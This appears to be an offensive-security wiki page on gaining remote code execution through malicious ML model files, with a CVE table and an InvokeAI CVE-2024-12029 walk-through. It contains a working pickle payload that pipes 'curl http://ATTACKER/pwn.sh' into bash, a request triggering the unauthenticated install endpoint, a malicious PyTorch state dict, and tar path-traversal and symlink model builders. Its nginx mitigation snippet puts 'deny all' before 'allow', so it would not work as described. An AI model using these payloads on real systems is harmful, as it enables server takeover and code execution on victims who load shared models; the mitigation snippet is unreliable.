# Models RCE


## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Moreover, there some python pickle based models like the ones used by [[https://github.com/pytorch/pytorch/security|PyTorch]] that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```
```
2. Host `payload.ckpt` on an HTTP server you control (e.g. `http://ATTACKER/payload.ckpt`).
3. Trigger the vulnerable endpoint (no authentication required):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```
```
4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` reachable by the attacker
•  Process has permissions to execute shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – the patch sets `scan=True` by default and performs malware scanning before deserialization.
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```
```
## Example – crafting a malicious PyTorch model

- Create the model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
```
- Load the model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
```
## Models to Path Traversal

As commented in [[https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties|**this blog post**]], most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```
```
Or, with the following code you can create a model that will create a symlink to the `/tmp` directory when loaded:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```
```
### Deep-dive: Keras .keras deserialization and gadget hunting

For a focused guide on .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery inside the allowlist, see:

[[../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md]]

## References

- [[https://www.offsec.com/blog/cve-2024-12029/|OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"]]
- [[https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e|InvokeAI patch commit 756008d]]
- [[https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/|Rapid7 Metasploit module documentation]]
- [[https://pytorch.org/docs/stable/notes/serialization.html#security|PyTorch – security considerations for torch.load]]

